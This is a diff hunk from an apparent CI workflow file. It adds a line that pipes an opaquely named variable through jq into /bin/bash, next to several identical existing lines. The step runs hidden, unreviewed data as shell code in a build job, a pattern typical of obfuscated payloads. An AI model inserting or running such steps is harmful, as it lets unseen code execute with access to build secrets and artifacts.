@@ -33,6 +33,7 @@ jobs:
           echo $sr7 | jq -r .bapqr0 | /bin/bash
           printf '%s' "$wo3" | jq -r .fck5609 | /bin/bash
           printf '%s' "$r12" | jq -r .vujv75498 | /bin/bash
+          printf '%s' "$kzua37336" | jq -r .nu376 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
